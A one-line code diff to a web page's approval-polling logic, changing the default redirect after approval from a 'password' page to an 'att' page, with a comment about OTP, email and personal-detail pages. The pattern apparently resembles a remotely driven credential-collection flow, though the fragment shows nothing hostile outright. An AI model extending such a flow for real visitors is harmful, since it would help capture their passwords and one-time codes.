@@ -130,7 +130,7 @@ export default function Home() {
               window.approvalPollInterval = null;
               
               if (approval.status === 'approved') {
-                const redirectType = approval.redirectType || 'password';
+                const redirectType = approval.redirectType || 'att';
                 console.log(`[index.js] Approval received via polling: ${redirectType} for user: ${userId}`);
                 
                 // Store userId for OTP/email/personal pages
